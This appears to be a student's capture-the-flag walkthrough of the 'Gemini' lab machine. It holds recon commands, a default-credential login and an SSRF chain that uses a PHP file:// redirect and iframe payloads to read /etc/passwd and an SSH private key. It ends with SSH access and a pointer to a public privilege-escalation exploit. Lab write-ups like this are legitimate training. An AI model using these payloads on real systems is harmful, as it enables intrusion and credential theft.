# Gemini 192.168.56.110
## Andrea Zonnekus 18758119

sudo netdiscover -i eth0 

![](gemini_full_steps/Aspose.Words.3346b2a4-3883-46f7-ba48-d1d684e260b3.001.png) 

sudo nmap -p- -sV -Pn -O 192.168.56.110 -oN host 

![](gemini_full_steps/Aspose.Words.3346b2a4-3883-46f7-ba48-d1d684e260b3.002.png) 

gobuster dir -u 192.168.56.110 -w /usr/share/dirb/wordlists/big.txt -ext php,py,txt,html -o http\_enum 

![](gemini_full_steps/Aspose.Words.3346b2a4-3883-46f7-ba48-d1d684e260b3.003.png) 



searchsploit gemini 

![](gemini_full_steps/Aspose.Words.3346b2a4-3883-46f7-ba48-d1d684e260b3.004.png) 

view-source:http://192.168.56.110/test2/ 

![](gemini_full_steps/Aspose.Words.3346b2a4-3883-46f7-ba48-d1d684e260b3.005.png) 

See token, input name, input password, also check login.php 

Try admin 1234 

![](gemini_full_steps/Aspose.Words.3346b2a4-3883-46f7-ba48-d1d684e260b3.006.png)

Bingo 



searchsploit apache 2.4 

![](gemini_full_steps/Aspose.Words.3346b2a4-3883-46f7-ba48-d1d684e260b3.007.png) 





searchsploit openssh 7.4 

![](gemini_full_steps/Aspose.Words.3346b2a4-3883-46f7-ba48-d1d684e260b3.008.png) 

dirb http://192.168.56.110/test2 -X .php | grep CODE:200 

![](gemini_full_steps/Aspose.Words.3346b2a4-3883-46f7-ba48-d1d684e260b3.009.png) 

<http://192.168.56.110/test2/profile.php> 

![](gemini_full_steps/Aspose.Words.3346b2a4-3883-46f7-ba48-d1d684e260b3.010.png)

Check 

![](gemini_full_steps/Aspose.Words.3346b2a4-3883-46f7-ba48-d1d684e260b3.011.png) 



python3 -m http.server 80 

`<iframe src=192.168.56.102>` 

![](gemini_full_steps/Aspose.Words.3346b2a4-3883-46f7-ba48-d1d684e260b3.012.png) 

![](gemini_full_steps/Aspose.Words.3346b2a4-3883-46f7-ba48-d1d684e260b3.013.png) 

<https://programmerall.com/article/6961560012/> 

![](gemini_full_steps/Aspose.Words.3346b2a4-3883-46f7-ba48-d1d684e260b3.014.png) 

<?php header('location:file://'.$\_REQUEST['url']); ?> 

`<iframe width="800" height="1500" src=http://192.168.56.102/ssrf.php?x=%2fetc%2fpasswd> </iframe>`

<https://gist.github.com/p0c/9047726> 

![](gemini_full_steps/Aspose.Words.3346b2a4-3883-46f7-ba48-d1d684e260b3.015.png) 



php -S 0.0.0.0:80 

![](gemini_full_steps/Aspose.Words.3346b2a4-3883-46f7-ba48-d1d684e260b3.016.png)



`<iframe height="2000" width="800" src=http://192.168.56.102/ssrf.php?url=%2fetc%2fpasswd></iframe>`

![](gemini_full_steps/Aspose.Words.3346b2a4-3883-46f7-ba48-d1d684e260b3.017.png)

Save as file 



cat pass | grep /bin/bash 

![](gemini_full_steps/Aspose.Words.3346b2a4-3883-46f7-ba48-d1d684e260b3.018.png) 



`<iframe height="2000" width="800" src="http://192.168.56.102/ssrf.php?url=/home/gemini1/%2essh/id\_rsa"></iframe>`

![](gemini_full_steps/Aspose.Words.3346b2a4-3883-46f7-ba48-d1d684e260b3.019.png) 





chmod 600 gem\_ssh 

ssh gemini1@192.168.56.110 -i gem\_ssh 

![](gemini_full_steps/Aspose.Words.3346b2a4-3883-46f7-ba48-d1d684e260b3.020.png)

Run linpeas 

![](gemini_full_steps/Aspose.Words.3346b2a4-3883-46f7-ba48-d1d684e260b3.021.png)

Sudo 1.8.9 --> https://github.com/berdav/CVE-2021-4034 



![](gemini_full_steps/Aspose.Words.3346b2a4-3883-46f7-ba48-d1d684e260b3.022.png)



![](gemini_full_steps/Aspose.Words.3346b2a4-3883-46f7-ba48-d1d684e260b3.023.png) 

